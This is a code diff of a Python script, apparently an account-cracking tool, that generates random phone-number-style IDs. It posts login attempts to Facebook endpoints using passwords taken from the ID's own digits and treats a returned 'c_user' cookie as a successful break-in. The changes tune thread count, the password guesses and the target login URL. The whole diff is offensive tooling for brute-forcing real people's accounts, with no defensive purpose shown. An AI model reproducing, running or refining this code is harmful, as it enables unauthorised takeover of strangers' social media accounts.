@@ -92,7 +92,7 @@ def random_number():
     for _ in range(limit):
         x = "".join(random.choice(string.digits) for _ in range(6))
         idz.append(x)
-    with ThreadPoolExecutor(max_workers=50) as XYZ:
+    with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
         total_idz = str(len(idz))
         print(f' \033[1;32m(√) \033[1;32mTotal IDs  :\033[1;32m ',total_idz)
@@ -102,7 +102,7 @@ def random_number():
         for xyz in idz:
             uidd = code+xyz
             uid = uidd
-            pww = [uidd[:6],uidd[:7],uidd[:8],uidd] 
+            pww = [uidd[:6],uidd[:6],uidd[:6]] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(ATOM, uid, pww, total_idz)
     linex()
@@ -173,7 +173,7 @@ def ATOM(uid, pww, total_idz):
             "sec-ch-prefers-color-scheme":"dark",
             "Accept-Encoding":"gzip, deflate, br, zstd",
             "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
-            response = session.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
